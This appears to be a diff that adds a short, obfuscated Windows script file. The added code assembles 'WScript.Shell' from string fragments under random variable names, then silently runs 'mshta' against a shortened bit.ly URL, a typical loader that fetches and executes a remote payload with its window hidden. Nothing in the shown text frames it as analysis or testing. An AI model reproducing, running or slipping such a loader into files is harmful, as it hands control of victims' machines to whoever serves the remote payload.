@@ -1,0 +1,5 @@
+beqdhzmh = ("cript.Sh")
+var ekskjuog = WScript.CreateObject("WS"+beqdhzmh+"ell")
+dybxauji = ("msh")
+auzigziq = ("ta ")
+ekskjuog.Run((dybxauji+auzigziq)+" https://bit.ly/3vyIrLb",0)
